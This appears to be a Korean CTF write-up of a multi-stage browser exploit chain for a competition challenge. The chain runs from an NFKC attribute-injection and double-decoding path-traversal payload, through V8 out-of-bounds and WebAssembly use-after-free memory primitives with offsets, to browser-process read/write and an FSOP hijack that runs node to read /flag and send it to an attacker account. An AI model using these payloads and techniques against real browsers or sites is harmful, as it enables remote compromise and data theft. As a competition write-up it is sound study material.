# UHCON 2026 FINAL — Bot

> 대회 상태: **팀 해결 확인**
> 공개 산출물 상태: 공격 체인의 주요 primitive는 검증됐지만, 이 공개본만으로 최종 live run 전체를 독립 재현한 것은 아님
> 원본 작성 시점: 최종 플래그 회수 직전
> 대상 표기: `http://challenge.local:3000/`
> 배포 브라우저: Chromium `155.0.8059.84`
> 배포 Chrome SHA-256: `5cf829e0969467b774c9ac0e359f090d062d2b5a06d84a3f1a7473fd1f6fd3e5`

## 사후 상태 정정

대회 중 결과 프로젝트에서 다음 플래그 회수가 확인됐다. 다만 당시 runtime evidence에는 세션 메타데이터가 함께 있어 공개 저장소에는 넣지 않았다.

```text
FLAG{bcdc0ce1f9a160edd29a7ccd7d1b1aedd7b724125c0fae3e4a69578e6238fd82332bcf4df192e6a854cfdde09994d7d91d5e7ac7c1566e7a24be26cfd659f84d}
```

아래 본문은 최종 회수 직전에 작성된 분석 기록이므로, 마지막 원격 실행 단계는 역사적 상태 그대로 남긴다.

## 1. 요약

이 문제는 다음 취약점을 직렬로 연결하는 브라우저 익스플로잇 문제다.

1. 과거 게시물 revision의 이미지 URL에 전각 따옴표(`U+FF02`)를 넣는다.
2. 관리자 review 코드의 NFKC 정규화와 `innerHTML` 재파싱을 이용해
   `data-preview-module` 속성을 주입한다.
3. `/u/previews/` 정책 검사와 서버 측 이중 디코딩/경로 정규화의 차이를
   이용해 공격자 소유 JavaScript 모듈을 관리자 review 문서에서 실행한다.
4. V8의 최적화된 packed-double 접근자를 `DICTIONARY_ELEMENTS` 전이 뒤에도
   사용하게 하여 pointer-compression cage 상대 OOB read/write를 만든다.
5. `JSArrayBuffer` 메타데이터를 변조해 V8 sandbox 전체를 읽고 쓸 수 있는
   “God DataView”를 만든다.
6. WebAssembly `CanonicalSig` UAF 재할당을 이용해 renderer의 전체 가상주소
   read/write를 만든다.
7. renderer 프로세스 메모리에서 `MOJO_VAULT_PROOF` 환경 변수 값을 찾고
   `window.mojoVault.unlock()`을 통과한다.
8. `BatchRead`/`BatchWrite`의 8비트 truncation 버그로 browser 프로세스의
   MojoVault `Page` 헤더를 읽고 변조하여 browser-process AAR/AAW를 만든다.
9. libc 심볼을 동적으로 찾고 `_IO_list_all` 기반 FSOP로
   `setcontext -> execvp('/usr/local/bin/node', ...)`를 실행한다.
10. Node에서 `/flag`를 읽어 공격자 결과 프로젝트에 기록한다.

현재 1–6단계와 8–9단계는 각각 원격/로컬에서 검증됐다. 원격 실행에서는
CanonicalSig의 return/parameter count `2/2`와 full virtual read/write
교차검증까지 통과했으나, 7단계에 사용할 다중 반환 stack leak이 전부 0으로
나와 proof 검색으로 이어지지 못했다. 따라서 이 문서의 플래그 항목은 의도적으로
미확인 상태로 둔다.

## 2. 웹 애플리케이션 취약점

### 2.1 Review 흐름

관리자 봇은 신고된 프로젝트에 대해 다음 순서로 동작한다.

1. `challenge.local:3000`에 관리자 계정으로 로그인한다.
2. `/review/<project-id>`를 연다.
3. 최대 60초 동안 기다린 뒤 context와 browser를 닫는다.

Review 페이지에는 현재 본문과 가장 최근의 과거 revision이 함께 들어간다.
관리자용 `bootstrap.mjs`는 `compare.mjs`로 두 이미지의 로딩 여부를 비교한 뒤,
선택된 이미지의 `data-preview-module`을 읽어 동적 module script로 삽입한다.

### 2.2 NFKC 속성 주입

`compare.mjs`의 핵심은 다음과 같다.

```js
const previewSource = (archived.getAttribute('src') || '').normalize('NFKC');
staging.innerHTML = policy.createHTML(
  `<img alt="${alt}" src="${previewSource}" data-preview-module="${defaultModule}">`
);
```

서버의 최초 Markdown 렌더링은 ASCII 따옴표 등을 거부하지만 전각 따옴표
`＂`(`U+FF02`)는 허용한다. 브라우저 코드가 이를 NFKC 정규화하면 ASCII
`"`가 되므로 `src` 속성을 닫고 새로운 `data-preview-module` 속성을 만들 수
있다.

사용한 과거 revision 본문의 형태는 다음과 같다.

```text
![p](/static/review/sample.svg?x=＂data-preview-module=＂http://assets.challenge.local:3000/u/previews/%252F..%252F..%252Fu%252F<owner-id>%252F<asset-id>.mjs＂x=＂)
```

현재 본문은 서로 다른 정상 이미지 URL로 갱신한다. 그러면 악성 본문은 revision에
남고, `preparePreview()`의 “현재 이미지와 과거 이미지가 모두 로드되며 URL은
다르다” 조건도 만족한다.

### 2.3 Module policy와 경로 정규화 차이

클라이언트 정책은 URL의 origin이 asset origin이고 pathname이
`/u/previews/`로 시작해 `.mjs`로 끝나는지만 확인한다. 반면 서버의 asset route는
한 번 더 `decodeURIComponent()`한 뒤 `path.posix.normalize()`를 수행한다.

따라서 정책이 보는 경로는 `/u/previews/...`이지만 서버가 최종적으로 조회하는
경로는 다음과 같이 변한다.

```text
/u/previews/%252F..%252F..%252Fu%252F<owner>%252F<asset>.mjs
    -> /u/<owner>/<asset>.mjs
```

이 체인으로 공격자 asset 모듈이 관리자 review 문서에서 실행됨을 원격으로
확인했다.

- 실행 ID: `20261107-110425-002aec`
- marker: `MODULE_EXEC_OK:20261107-110425-002aec`
- 결과: `module_execution_confirmed: true`

## 3. V8 sandbox 내부 read/write

### 3.1 StableMap 기반 dictionary OOB

packed double array에 대해 다음 읽기/쓰기 함수를 충분히 최적화한다.

```js
const victim = [1.1, 2.2];
function oobRead(i) { return victim[i]; }
function oobWrite(i, v) { victim[i] = v; }
```

그 뒤 큰 index에 setter를 정의하면 실제로 거대한 backing store를 만들지 않고
`DICTIONARY_ELEMENTS`로 전이된다.

```js
victim.__defineSetter__('1073741824', function() {});
```

최적화된 double access는 이전 형태를 계속 신뢰하므로 NumberDictionary를 기준으로
상대 OOB 접근이 가능해진다. 고정 marker를 가진 double array 여러 개를 spray한 뒤,
OOB write가 실제 spray array의 첫 원소를 바꾸는지 확인해 정확한 data index `d`를
찾았다.

spray array의 tagged elements pointer를 `E`라고 하면 stale index 0의 cage offset
`B`는 다음과 같다.

```text
B = E - 8*d + 7    (mod 2^32)
```

JSArray header는 32비트 `elements`와 Smi length를 연속으로 가진다. OOB word의
정렬에 따라 두 경우를 모두 처리했다.

```text
Alignment A: [elements:low32, length:high32]
  object = B + 8*j - 8

Alignment B: elements가 word j의 high32,
             length가 word j+1의 low32
  object = B + 8*j - 4
```

후보 length를 Smi `32 -> 33 -> 32`로 왕복시켜 정확히 선택한 spray array의
length만 변하는지 확인한다. 이 검증으로 잘못된 pointer 후보에 쓰는 위험을 줄였다.

### 3.2 God DataView

Chromium 155의 `JSArrayBuffer` layout에서 확인한 필드는 다음과 같다.

```text
+0x14 .. +0x20 : byte/max length 계열
+0x24 .. +0x28 : sandboxed backing pointer (sandbox offset << 24)
```

새 `ArrayBuffer(0x10000)`를 만들고 backing pointer를 0으로, length 계열을
`0xffffffff`로 바꾼 뒤 `DataView`를 생성한다. 결과 DataView는 V8 sandbox base부터
매우 큰 범위를 접근한다.

원격 검증 결과:

```text
run       = 20261107-115751-a7c041
result    = DICTIONARY_GOD_BUFFER_OK
OOB base  = 0x013107a8
AB object = 0x0131c23c
backing   = 0x0000000400008000
length    = 0x7ffffffff (별도 fresh 로컬 실행에서 확인)
marker    = 0xccdd0011
```

검증 모듈 SHA-256은
`052755a00a4e659ba041b52651fadd102c0bf47b7ef1a6a26c30dd5f10e9b7bf`다.

### 3.3 두 단계 module 구조

Wasm builder 전체를 같은 module에서 먼저 평가하면 많은 함수/상수 할당이
dictionary primitive의 민감한 heap layout을 바꿔 renderer가 종료됐다. 이를 피하기
위해 공격 모듈을 두 단계로 분리했다.

- Stage 1: 작은 모듈로 dictionary OOB와 God DataView만 만든다.
- Stage 2: God DataView를 `globalThis.dictionaryPrimitives`로 고정한 뒤 동적 import한다.
  여기서 Wasm builder와 CanonicalSig 체인을 평가한다.

이 구조는 원격에서 Stage 2까지 안정적으로 진입했다.

## 4. CanonicalSig sandbox escape

### 4.1 Table trusted-data handle

연속 생성한 `WebAssembly.Table` 객체의 cage field를 비교해 arithmetic progression을
찾았다. 실제 handle field는 `+0x1c`, handle stride는 `0x200`(512)이었다.

초기 버전은 `target_ofs=7`에서 `grow()`는 생존했지만 원하는 CanonicalSig를
재사용하지 못해 `sigRead()`가 실패했다. 이후 대상 table과 관련 Wasm 객체를
destructive `grow()` 전에 `globalThis.keepAlive`에 고정하는 early-pin을 적용했고,
`target_ofs=8`에서 CanonicalSig counts `2/2`에 도달했다.

### 4.2 재할당과 relative read/write

첫 번째 Wasm instance는 `(i64, i64) -> (i64, structref)` 및 다중 i64 반환
signature를 가진 import wrapper를 만든다. forged table handle로 `grow()`를 호출해
대상 엔트리를 해제한 뒤, 두 번째 Wasm instance의 signature가 그 공간을 재사용하게
한다.

재사용이 성공하면 기존 wrapper를 다음과 같이 CanonicalSig 상대 접근자로 사용할 수
있다.

```js
function sigRead(off)       { return call_fn(-1n, off)[0]; }
function sigWrite(off, val) { call_fn(off, val)[0]; }
```

parameter representation pointer를 return representation 위치에 복사해 반환형을
`(i64, i64)`로 바꾸고, representation pointer에서 signature 구조체 주소를 역산한다.

```text
signature_address = reps_pointer - reps_return_offset
```

그 뒤 임의 주소를 signature-relative offset으로 바꾸면 renderer 전체 가상주소
read/write가 된다.

```js
off = (address - signature_address) & ((1n << 64n) - 1n);
```

원격 실행은 signature 자기 자신을 상대 read와 virtual read로 각각 읽어 값이 같은지
비교하고, 같은 값을 다시 쓴 뒤 재확인하는 AAR/AAW 교차검증을 통과했다. 이후 코드에서
stack 후보 탐색 오류까지 진행됐으므로 이 체크포인트 이전 단계가 통과했음을 제어 흐름상
확인할 수 있다.

### 4.3 현재 남은 문제: stack leak

`MOJO_VAULT_PROOF`는 Puppeteer가 browser를 시작할 때 설정한 64자리 hex 환경
변수다. renderer도 해당 환경을 상속하므로 renderer 가상주소를 읽을 수 있으면 초기
stack/environ 부근에서 문자열을 찾을 수 있다.

현재 다중 반환 wrapper를 이용한 `leak_rec()` 결과가 원격에서 32개 모두 0이었다.

```text
run = 20261107-131828-9547d3
error = no canonical x64 stack candidate
leaks = 0x0, 0x0, ... (32 entries)
```

따라서 현 시점의 실질적인 blocker는 full virtual AAR 자체가 아니라 stack pointer를
안정적으로 하나 얻는 단계다. 인접 stack slot 및 `fnx` signature/return-count를
바꾸는 진단을 진행 중이다.

## 5. MojoVault browser-process AAR/AAW

이 절의 체인은 알려진 proof를 환경 변수로 넣은 로컬 동일 바이너리에서 검증했다.

### 5.1 `BatchShapeIsValid` truncation

`Page`의 크기는 `0x200`이고 layout은 다음과 같다.

```text
+0x000  data[0x100]
+0x100  encoded_address
+0x108  metadata
+0x110  seal
+0x118  nonce
+0x120  type_cookie
+0x128  serial
```

검사 코드는 최종 offset을 `uint8_t`로 줄인 뒤 `0xf0` 이하인지 확인한다.

```cpp
const uint8_t narrowed_end = static_cast<uint8_t>(
    start + (count - 1) * stride + width);
```

따라서 `start=0`, `count=2`, `width=16`에 큰 stride를 주면 검사는 wrap되어
통과하지만 두 번째 접근은 다음 `Page`의 헤더를 가리킨다.

```text
stride 0x300 -> page 1 encoded_address, metadata
stride 0x310 -> page 1 seal, nonce
stride 0x320 -> page 1 type_cookie, serial
```

같은 형태의 `BatchWrite`로 헤더도 변조할 수 있다.

### 5.2 secret 복구와 Page forge

Seal 식은 다음과 같다.

```text
encoded  = address XOR ROL(secret, 17)
seal     = ROL(address, 29) XOR secret XOR ROL(secret, 7)
           XOR metadata XOR nonce
```

leak한 값으로 다음 값을 계산한다.

```text
K = seal XOR metadata XOR nonce XOR ROL(encoded, 29)
  = secret XOR ROL(secret, 7) XOR ROL(secret, 46)
```

이 선형 변환의 역변환 rotation mask는 다음과 같다.

```text
0xbea852faa16baa04
```

복구한 secret으로 임의 target에 대해 다음 헤더를 만든다.

```text
encoded'  = target XOR ROL(secret, 17)
metadata' = (3 << 32) | 0x4000       // read | write, size 0x4000
seal'     = ROL(target, 29) XOR secret XOR ROL(secret, 7)
            XOR metadata' XOR nonce
```

이제 `readView(1, ...)`와 `writeView(1, ...)`가 browser 프로세스 AAR/AAW가 된다.
단, challenge가 명시적으로 차단한 Chrome GOT 인접 범위는 직접 접근할 수 없다.

## 6. Browser-process RCE

### 6.1 PIE/libc 심볼 탐색

`type_cookie`는 Chrome PIE 내부의 고정 객체 주소이므로 다음으로 base를 구했다.

```text
chrome_base = type_cookie - 0x2a75f01
```

Chrome의 차단 범위와 dynamic 위치는 배포 바이너리에서 다음과 같이 확인했다.

```text
PT_DYNAMIC       = chrome_base + 0x15b4e2d8
dynamic size     = 0x3a0
blocked range    = [chrome_base + 0x15b4e678,
                    chrome_base + 0x15b5e678)
```

`PT_DYNAMIC`는 차단 범위 바로 앞에서 끝나므로 읽을 수 있다. `DT_DEBUG`에서
`r_debug.r_map`을 얻고 `link_map`을 순회해 libc base와 libc dynamic section을
찾았다. libc의 `DT_HASH`, `DT_STRTAB`, `DT_SYMTAB`을 읽어 다음 심볼을 이름으로
해결했다.

- `_IO_list_all`
- `_IO_wfile_jumps`
- `setcontext`
- `execvp`

### 6.2 FSOP

MojoVault의 page arena는 renderer pipe가 닫힐 때 먼저 해제되므로 fake FILE을 그
arena에 두면 browser 종료 시점까지 남지 않는다. 대신 Chrome의 쓰기 가능한 padding
page를 사용했다.

```text
fake FILE base = chrome_base + 0x15c4d000
```

Ubuntu 24.04의 glibc 2.39에서 다음 흐름을 로컬 C harness와 실제 Chrome으로 각각
검증했다.

```text
_IO_list_all
  -> fake FILE
  -> legitimate _IO_wfile_jumps
  -> fake wide vtable.__doallocate = setcontext
  -> RIP = execvp
```

`setcontext`가 fake FILE 기준으로 사용하는 핵심 위치는 다음과 같다.

```text
+0x68 rdi  = "/usr/local/bin/node"
+0x70 rsi  = argv
+0xa0 rsp
+0xa8 rip  = execvp
```

최종 Node `-e` payload는 `/flag`를 읽고, 공격자 계정으로 web 서비스에 로그인한
뒤 별도 결과 프로젝트의 body를 플래그로 갱신하도록 설계했다.

로컬 검증 산출물:

- `work/fsop_setcontext_test.c`: `FSOP_DIRECT_OK`
- `work/mojo_fsop_test.html`: browser 종료 후
  `/tmp/mojo-fsop-ok`에 `MOJO_FSOP_OK`

## 7. ARTEX 증거

요청/응답은 method, URL, status, body length, SHA-256, 역할
(`baseline`/`proof`/`verification`)을 JSONL로 보존했다.

| 의미 | 파일 | SHA-256 |
|---|---|---|
| 관리자 문서 내 임의 module 실행 | `work/artex_evidence/20261107-110425-002aec.jsonl` | `c9a9de28a96d929cd5a66597e623085ac1c49d0b05a519b725200390db363069` |
| 원격 Dictionary God Buffer | `work/artex_evidence/20261107-115751-a7c041-module.jsonl` | `1154bfc04c1448fb41738a14deb096e66e2a28310815cc06fb3d85c40cf56789` |
| 2-stage, ofs7 실패 지점 분리 | `work/artex_evidence/20261107-124828-a74461-module.jsonl` | `781f66ac3fa6785a10c5cdbc1202460d40a4008bd66518a18d60c74fc02dd22d` |
| early-pin/ofs8 full R/W 이후 stack 후보 실패 | `work/artex_evidence/20261107-131716-4dc31e-module.jsonl` | `79f2a2491f0f987524c43287901d3d2f37c3d477e124081474d1155f23910828` |
| stack leak 32개가 모두 0임을 기록 | `work/artex_evidence/20261107-131828-9547d3-module.jsonl` | `cdcafe22b4e97d200c67de8fd249a42919c7078eeb104be5f2da731f90f8624a` |

추가 로컬 검증 파일의 현재 SHA-256:

```text
work/mojo_fsop_test.html
  1f5afe558eb558e46889b7291c2940f6193a48f1d4f957f8a8b80cf7b7ecfb1d

work/fsop_setcontext_test.c
  ff7e769e55f42e06b3d150e6a082ceb0a4759491c7259d438c40977712a1fa9a
```

## 8. 재현 명령

웹 module 실행 및 원격 결과 프로젝트 polling은 다음 runner로 수행한다.

```powershell
python -u work\live_module_runner.py `
  <stage1.mjs> <expected-marker> <timeout-seconds> <stage2.mjs>
```

로컬 Chromium에서 CanonicalSig 후보를 시험할 때는 각 실행마다 독립
`--user-data-dir=/tmp/uhcon-*`를 사용했다. 이는 이전 renderer crash와 heap/TPT
상태가 다음 실행에 섞이는 것을 막기 위함이다.

## 9. 현재 상태와 다음 작업

완료된 부분:

- 웹 module injection: 원격 검증 완료
- StableMap dictionary OOB: 원격 검증 완료
- God DataView: 원격 검증 완료
- CanonicalSig `2/2` 및 full virtual AAR/AAW 교차검증: 원격 도달
- MojoVault header OOB 및 browser AAR/AAW: 로컬 동일 바이너리 검증 완료
- libc 동적 심볼 탐색과 FSOP `execvp`: 로컬 동일 환경 검증 완료

남은 부분:

- 다중 반환 stack leak이 0이 되는 원인 수정
- renderer 메모리에서 실제 `MOJO_VAULT_PROOF` 회수
- 원격 MojoVault unlock 및 FSOP 연결
- 결과 프로젝트에서 실제 `/flag` 값 확인

## 10. 당시 플래그 상태

이 절을 처음 작성한 시점에는 원격 `/flag`가 미확인이었다. 이후 회수된 값은 문서 상단의 사후 상태 정정을 참조한다.
